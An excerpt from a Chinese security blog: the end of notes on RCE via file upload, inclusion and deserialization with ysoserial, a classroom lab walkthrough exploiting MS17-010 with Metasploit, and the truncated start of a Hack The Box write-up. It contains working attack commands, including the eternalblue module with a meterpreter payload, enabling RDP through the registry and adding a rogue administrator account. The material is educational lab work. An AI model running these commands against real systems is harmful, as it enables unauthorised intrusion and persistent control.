title="Files.write"></a>Files.write</h4><p>Files.write是Java NIO包中的一个高级方法，用于以简单、直接的方式将字节序列写入文件。它自动处理文件的打开和关闭，避免了手动管理底层资源。内部实现上，Files.write提供了缓冲机制，能够有效提升写入性能，适用于写入文本或二进制数据。此方法支持一次性写入所有内容，使得文件操作既高效又易于使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test4.jsp&quot;</span>;<br>            List&lt;String&gt; lines = Arrays.asList(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            Files.write(Paths.get(filePath), lines, StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修复-预防方案-1"><a href="#修复-预防方案-1" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><p>PHP：可以使用安全过滤函数，禁止写入敏感代码，例如strip_tags可以移除php标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> ;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;E://Code//Test_RCE&quot;</span>,<span class="hljs-variable">$content</span>.<span class="hljs-string">&quot;\n&quot;</span>,FILE_APPEND);<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;E://Code//Test_RCE&quot;</span>,<span class="hljs-string">&quot;Defense&quot;</span>.<span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$content</span>),FILE_APPEND);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>路径验证：在应用程序中对文件路径进行验证，确保用户提供的文件路径是受信任且合法的。不要直接使用用户提供的路径来写入文件，而是应该使用相对路径或者将用户提供的路径与预定义的安全路径进行组合</li><li>权限控制：确保应用程序以最低权限执行，限制其对文件系统的写入权限。在操作系统级别，确保文件系统权限设置正确，应用程序只能写入其必要的目录，并且仅有必要的权限</li><li>文件名随机化：在写入文件时，使用随机生成的文件名而不是用户提供的文件名。这可以防止攻击者直接访问写入的文件</li><li>白名单验证：对于涉及到写入文件的操作，应该使用白名单验证来限制写入的文件类型和目录。只允许应用程序写入预定义的安全目录，并且只允许写入特定类型的文件</li></ul><h2 id="文件上传导致RCE"><a href="#文件上传导致RCE" class="headerlink" title="文件上传导致RCE"></a>文件上传导致RCE</h2><p>文件上传漏洞（File Upload Vulnearability），通常发生在Web应用程序中，尤其是那些允许用户上传文件的地方。这种漏洞的本质在于，应用程序在处理上传的文件时没有充分验证或限制，从而允许攻击者上传恶意文件</p><h3 id="PHP任意文件上传方式"><a href="#PHP任意文件上传方式" class="headerlink" title="PHP任意文件上传方式"></a>PHP任意文件上传方式</h3><p>PHP只有<code>move_uploaded_file</code>函数负责文件上传，用法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-keyword">string</span><span class="hljs-variable">$from</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>参数设置：<code>$from</code>上传的文件的文件名，<code>$to</code>移动文件到这个位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;文件上传测试表单&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form action=<span class="hljs-string">&quot;1.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;选择文件&lt;/label&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传文件&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//move_uploaded_file</span><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tap_name&quot;</span>],<span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="修复-预防方案-2"><a href="#修复-预防方案-2" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><ul><li>白名单验证：仅允许上传已知安全的文件类型，例如图片文件（jpg, png等），并拒绝所有其他类型的文件。这要求系统能够验证文件的真实类型，而不仅仅是依赖文件扩展名</li><li>文件类型检测：通过检测文件的MIME类型或者文件内容的特定标识（如图片文件的头信息）来判断文件类型，而不是仅仅依赖于文件的扩展名。（不推荐，容易绕过）</li><li>文件内容扫描：使用病毒扫描工具扫描所有上传的文件，以识别和阻止恶意软件或脚本的上传</li><li>设置文件上传大小限制：限制可上传文件的大小，减少攻击者上传大型恶意文件的机会。（不推荐，部分木马内存较小）</li><li>文件存储隔离：不要将上传的文件存储在执行脚本的目录下，避免恶意脚本被服务器执行。可以将文件存储在非Web根目录下，并通过安全的方式提供文件访问（例如，通过脚本读取文件内容并输出，而不是直接通过URL访问）</li><li>重命名上传文件：为上传的文件重新命名（例如，使用UUID或其他随机字符串），避免直接使用用户提供的文件名，这样可以防止目录遍历攻击和文件覆盖攻击</li><li>设置强制访问控制：确保文件上传功能只对信任的用户开放，并对用户进行身份验证和授权</li></ul><h2 id="文件包含导致RCE"><a href="#文件包含导致RCE" class="headerlink" title="文件包含导致RCE"></a>文件包含导致RCE</h2><p>文件包含漏洞允许攻击者将服务器上的文件包含到输出页面中，或者包含远程文件，从而执行恶意代码。主要分为两种类型：本地文件包含（Local File Inclusion, LFI）和远程文件包含（Remote File Inclusion, RFI）</p><h3 id="PHP本地文件包含（LFI）"><a href="#PHP本地文件包含（LFI）" class="headerlink" title="PHP本地文件包含（LFI）"></a>PHP本地文件包含（LFI）</h3><p>众所周知，PHP的代码要执行的话，需要后缀名为.php。但PHP当中关于文件包含的函数就可以在文件名为.txt等其他不同后缀的情况下，执行PHP代码</p><p>利用include 和 require两个函数，同时包含1.txt，成功地输出了两次test字符。这两个函数的区别在于，如果include包含一个不存在的文件只会警告，而require会直接停止运行。还有两个函数为<code>include_once</code>和<code>require_once</code>，这两个函数与本身的区别在于，如果已经包含过了目标则不会包含</p><p>如果目标文件不是php代码，则会直接输出目标文件内容</p><h3 id="PHP-远程文件包含（RFI）-PHP伪协议"><a href="#PHP-远程文件包含（RFI）-PHP伪协议" class="headerlink" title="PHP 远程文件包含（RFI）+PHP伪协议"></a>PHP 远程文件包含（RFI）+PHP伪协议</h3><p>而PHP当中还有远程文件包含（RFI），在实战中，利用PHP伪协议的配合会有更多的进攻方向与思路。 而要使用远程文件包含需要目标环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen = Onallow_url_include = On<br></code></pre></td></tr></table></figure><p>这两个参数需要在php.ini单独设置，在php.ini中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off，所以需要我们手动从Off改成On</p><p>开启之后我们就可以进行利用了，一般来说，实战当中大部分都是文件包含配合 <code>php://input</code> 或 <code>data://</code> 进行RCE的</p><p><strong>php:&#x2F;&#x2F;input</strong></p><p>可以将post中的数据当成PHP的代码来执行</p><p><strong>data:&#x2F;&#x2F;</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">data:text/plain,<span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<br>data:<span class="hljs-comment">//text/plain,&lt;?php%20phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JAVA文件包含方式"><a href="#JAVA文件包含方式" class="headerlink" title="JAVA文件包含方式"></a>JAVA文件包含方式</h3><p>Java代码也是利用include进行文件包含</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//index.jsp</span><br>&lt;% <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test.jsp&quot;</span>; %&gt;<br>&lt;jsp:include page=<span class="hljs-string">&quot;&lt;%=file%&gt;&quot;</span>&gt;&lt;/jsp:include&gt;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;% out.println(Test!);%&gt;<br></code></pre></td></tr></table></figure><p>但不同于php，java的文件包含无法对.txt文件中的java代码进行解析，所有危害有限，一般作为任意文件读取或下载。但除非是被包含的jsp文件，正常方式无法访问到且其中存在危险函数，这时就可以利用文件包含打RCE了</p><h2 id="SSTI导致RCE"><a href="#SSTI导致RCE" class="headerlink" title="SSTI导致RCE"></a>SSTI导致RCE</h2><p>在说ssti之前，先说下模板引擎，简单来说就是为了分离用户界面和业务数据的。运行逻辑是先获取用户的输入，经过渲染后呈现到用户面前。而SSTI就是服务端模板注入，当用户输入恶意数据后，未经过滤下就可能造成安全危害</p><p>而服务器端模板注入（Server-Side Template Injection，SSTI）是一种安全漏洞，允许攻击者通过向服务器端模板引擎提交恶意输入数据来注入并执行不安全的代码。这种攻击的成功依赖于服务器端模板引擎的配置和功能</p><p><img src="/img/SSTI.png" alt="SSTI"></p><h3 id="修复-预防方案-3"><a href="#修复-预防方案-3" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><ul><li>验证和清理输入：对所有用户输入进行严格验证和清理，确保输入内容不包含可能会被模板引擎错误解释执行的代码或标记</li><li>使用安全的模板引擎配置：许多模板引擎提供了防止SSTI的安全配置选项。确保模板引擎以最安全的方式配置，并禁用不必要的功能</li><li>限制模板引擎功能：限制模板引擎可以访问的功能和API，尽量减少攻击者可利用的攻击面。例如，禁止模板直接访问文件系统或执行系统命令</li><li>使用沙箱环境：在可能的情况下，将模板引擎运行在沙箱环境中，以限制模板代码的执行权限，防止恶意代码访问或修改敏感资源</li><li>内容安全策略（CSP）：实施内容安全策略，限制可以执行的脚本类型和来源，降低潜在的攻击影响</li><li>更新和打补丁：定期更新和给模板引擎及其依赖库打补丁，以修复已知的安全漏洞</li></ul><h2 id="反序列化导致RCE"><a href="#反序列化导致RCE" class="headerlink" title="反序列化导致RCE"></a>反序列化导致RCE</h2><p>反序列化漏洞发生在当不安全地处理从不可信源接收的序列化数据时。序列化是将对象状态或数据结构转换为可以存储或传输的格式（如XML、JSON、二进制格式）的过程，而反序列化是将这种格式恢复为原始的对象状态或数据结构的过程。如果应用程序不安全地反序列化用户提供的数据，攻击者可能能够执行恶意代码或操作应用程序行为，导致数据泄露、服务拒绝、甚至完全控制受影响的服务器</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>在PHP当中，关于序列化和反序列化的魔法函数有很多，魔术方法是一种特殊的方法，当对 对象执行某些操作时会覆盖 PHP 的默认操作。而PHP中最为常见也是最为基础的就是<code>__construct</code>和<code>__destruct</code></p><p><strong>__construct</strong> 构造函数，具有构造函数的类会在每次创建新对象时先调用此方法</p><p><strong>__destruct</strong> 析构函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><p>先进行一次简单的序列化和反序列化的过程，如下，<code>OBjectOutputStream中writeObject</code>是进行序列化的过程，而readObject是进行反序列化的过程。并且从写入到object.dat文件当中可知，java序列化的数据不是纯文本格式不可读</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">serialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//序列化</span><br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;object.dat&quot;</span>));<br>            out.writeObject(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            out.close();<br>            <span class="hljs-comment">//反序列化</span><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;object.dat&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;反序列化的对象：&quot;</span> + in.readObject());<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Java进行反序列化RCE只用本身的代码较麻烦，这里使用一个通用简单的来演示，因为java需要安装依赖才能继续，所以先把大部分项目必备的依赖安装了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">commons</span>-beanutils-<span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">4</span>.jar(https://repo1.maven.org/maven2/commons-beanutils/commons-beanutils/<span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">4</span>/commons-beanutils-<span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">4</span>.ja)<br><span class="hljs-attribute">commons</span>-collections-<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.jar(https://repo1.maven.org/maven2/commons-collections/commons-collections/<span class="hljs-number">3</span>.<span class="hljs-number">1</span>/commons-collections-<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.jar)<br><span class="hljs-attribute">commons</span>-logging-<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>.jar(https://repo1.maven.org/maven2/commons-logging/commons-logging/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>/commons-logging-<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>.jar)<br></code></pre></td></tr></table></figure><p>java生成payload的工具</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ysoserial.jar（https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/frohoff/y</span>soserial）<br></code></pre></td></tr></table></figure><p>将依赖都放在项目目录下，并add to library</p><p>使用命令生成 payload</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span><span class="hljs-string">&quot;ysoserial-all.jar&quot;</span> CommonsBeanutils1 <span class="hljs-string">&quot;calc.exe&quot;</span> &gt; <span class="hljs-number">1</span>.ser<br></code></pre></td></tr></table></figure><p>访问index.jsp，可以看出成功弹出计算器，rce成功</p><h3 id="修复-预防方案-4"><a href="#修复-预防方案-4" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><p>尽量用高版本JDK，因为禁了 <code>RMI Codebase</code> &#x2F; <code>TemplatesImpl （JDK17）</code> 等危险的类</p><p>使用白名单机制限制可反序列化的类和对象类型，只允许已知、受信任的类进行反序列化。确保白名单列表具有最小化的权限，即只包含必需的类和对象</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MS17-010(Eternal blue永恒之蓝)漏洞复现</title>
    <link href="/2024/05/29/ms17-010/"/>
    <url>/2024/05/29/ms17-010/</url>
    
    <content type="html"><![CDATA[<h1 id="MS17-010-Eternal-blue永恒之蓝"><a href="#MS17-010-Eternal-blue永恒之蓝" class="headerlink" title="MS17-010(Eternal blue永恒之蓝)"></a>MS17-010(Eternal blue永恒之蓝)</h1><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>永恒之蓝（EternalBlue）是一个由美国国家安全局（NSA）开发的漏洞利用工具，被用于攻击微软Windows操作系统中的漏洞。这个漏洞利用工具最初泄露于公众的是在2017年4月，因此得名“永恒之蓝”</p><p>具体来说，永恒之蓝利用了微软Windows操作系统中的一个名为MS17-010的漏洞，该漏洞存在于微软的SMBv1协议实现中。攻击者可以利用这个漏洞来远程执行恶意代码，甚至控制受感染的计算机，而无需用户交互</p><p>攻击者可以利用永恒之蓝进行各种恶意活动，包括勒索软件攻击、间谍活动、信息窃取等。该漏洞被广泛利用，导致了全球范围内的许多严重的网络安全事件，包括2017年的“想象力病毒”（WannaCry）攻击事件</p><p>微软在发现漏洞后发布了补丁来修复这个问题，并呼吁用户及时更新其系统以保护自己免受潜在的攻击。然而，由于许多用户未能及时更新其系统，永恒之蓝仍然是一个潜在的威胁，特别是对于那些运行旧版本Windows系统的用户。因此，及时更新系统补丁并采取其他安全措施仍然是保护自己免受此类攻击的最佳做法之一</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="前期探测"><a href="#前期探测" class="headerlink" title="前期探测"></a>前期探测</h3><p>本次的漏洞环境是上课老师提供的靶场，要求我们去扫描C段，查找存活的IP并尝试利用其存在的相关漏洞</p><p>我最初尝试使用goby进行扫描，也是最早通过它报警漏洞发现192.168.12.8的445开放，且可能存在MS17-010，之后使用nmap和fscan以及nessus扫描验证，确认192.168.12.8以及其他数十个IP存在MS17-010漏洞</p><p>nmap批量扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p445 --script smb-vuln-ms17-<span class="hljs-number">010</span> <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>fscan定点扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 192.168.12.8<br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开msfconsole终端，搜索MS17-010的相关漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure><p>在搜索到的相关模块中，选择<code>exploit/windows/smb/ms17_010_eternalblue</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-comment">#或者</span><br><span class="hljs-keyword">use</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>设置Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br></code></pre></td></tr></table></figure><p><strong>注意！</strong></p><p>网上大多数教程中，要求设置的Payload为：<code>set payload windows/meterpreter/reverse_tcp</code> 但在我的实验环境中，使用此Payload并未成功，具体分析为：</p><p><strong>reverse_tcp：</strong>攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经反向连接</p><p><strong>bind_tcp：</strong>攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入</p><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST</p><p>查看需要填写的相关参数、载荷等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p>设置目标被攻击主机的IP</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS 被攻击机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure><p>设置监听主机IP</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LHOST 本机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure><p>设置监听端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LPORT 本机端口<br></code></pre></td></tr></table></figure><p>开始攻击</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span><br><span class="hljs-comment">#或者</span><br>exploit<br></code></pre></td></tr></table></figure><p><strong>注意！</strong></p><p>开始攻击前，请确保本机的相关防护程序关闭，否则它们会变成内鬼</p><p><img src="/img/ms17_010_1.png" alt="ms17_010_1"></p><p>当出现<code>WIN</code>则表面漏洞利用成功</p><p><img src="/img/ms17_010_2.png" alt="ms17_010_2"></p><p>这边我尝试<code>getuid</code>查询用户，发现拿到的是系统权限</p><p>在<code>shell</code>后，查看ipconfig</p><p><img src="/img/ms17_010_3.png" alt="ms17_010_3"></p><p><img src="/img/ms17_010_4.png" alt="ms17_010_4"></p><p>使用screenshot还可以截取被攻击机器当前的屏幕截图</p><p><img src="/img/ms17_010_5.png" alt="ms17_010_5"></p><p>利用拿到的<code>shell</code>查看被攻击机器所开放的端口</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -an</span><br></code></pre></td></tr></table></figure><p>发现3389端口没有开放，手动给它打开</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="hljs-number">1</span><br><span class="hljs-comment">#或者</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure><p>显示<code>successful</code>即为成功</p><p>再次确认3389端口是否开启</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netstat -an|<span class="hljs-built_in">find</span> <span class="hljs-string">&quot;3389&quot;</span><br></code></pre></td></tr></table></figure><p>显示LISTENING即为监听中</p><p><strong>注意！</strong></p><p>远程桌面的默认端口是3389，为了防止管理员更改了远程端口给我们连接带来意想不到的情况，需要通过查看注册表键值确认远程桌面的端口是否为3389</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">REG</span> <span class="hljs-keyword">QUERY</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber<br></code></pre></td></tr></table></figure><p>若出现为0xd3d为正常，0xd3d为16进制的3389</p><p>添加一个新的用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">用户名 密码 /add</span><br></code></pre></td></tr></table></figure><p>将新建的用户添加进管理员组</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">net localgroup administrators 用户名 /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>成功连接远程桌面</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>Windows漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_No-Threshold</title>
    <link href="/2024/05/28/htb-WsTodo/"/>
    <url>/2024/05/28/htb-WsTodo/</url>
    
    <content type="html"><![CDATA[<h1 id="No-Threshold"><a href="#No-Threshold" class="headerlink" title="No-Threshold"></a>No-Threshold</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Prepare for the finest magic products out there. However, please be aware that we’ve implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.</p><p>为最好的魔法产品做好准备。但是，请注意，我们已经在我们的网络应用程序中实施了专门的保护咒语，以防止任何针对我们网上商店的黑魔法。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>下载题目源码进行分析，通过<code>dashboard.py</code>可知，当我们通过身份验证，便可以得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dash</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;private/dashboard.html&quot;</span>, 